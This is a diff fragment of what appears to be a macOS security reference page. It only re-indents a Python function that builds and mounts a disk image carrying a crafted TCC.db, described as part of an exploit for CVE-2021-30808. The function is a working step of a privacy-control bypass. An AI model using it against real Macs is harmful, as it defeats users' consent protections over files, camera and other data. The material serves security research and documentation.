@@ -392,12 +392,12 @@ hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```python
 # This was the python function to create the dmg
 def create_dmg():
-	os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
-	os.system("mkdir /tmp/mnt")
-	os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
-	os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
-	os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
-	os.system("hdiutil detach /tmp/mnt 1>/dev/null")
+    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
+    os.system("mkdir /tmp/mnt")
+    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
+    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
+    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
+    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
 
 Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).
